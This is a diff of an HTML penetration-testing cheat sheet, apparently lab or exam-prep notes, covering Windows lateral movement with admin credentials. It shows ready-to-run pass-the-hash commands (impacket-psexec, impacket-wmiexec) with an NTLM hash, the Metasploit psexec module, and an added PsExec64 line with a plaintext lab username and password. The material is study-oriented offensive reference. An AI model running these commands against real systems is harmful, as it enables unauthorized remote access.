@@ -201,10 +201,10 @@ set lhost 10.10.14.124
                     <p>In case you have admin credentials of a computer you may be able to use the following metasploit module which grants access to the server</p>
                     <pre><code class="language-bash">exploit/windows/smb/psexec</code></pre>
                     <p>You can always perform it manually</p>
-                    <pre><code class="language-bash"></code>impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212</code></pre>
+                    <pre><code class="language-bash"></code>impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd  #Alternative from windows</code></pre>
                     <p>Or wmicexe for the same purpose</p>
-                    <pre><code class="language-bash"></code>impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212</code></pre>
-                </ul>
+                    <pre><code class="language-bash"></code>impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212</code></pre></ul>
                 </ul>
 
                 <h3>Exploits RCE</h3>
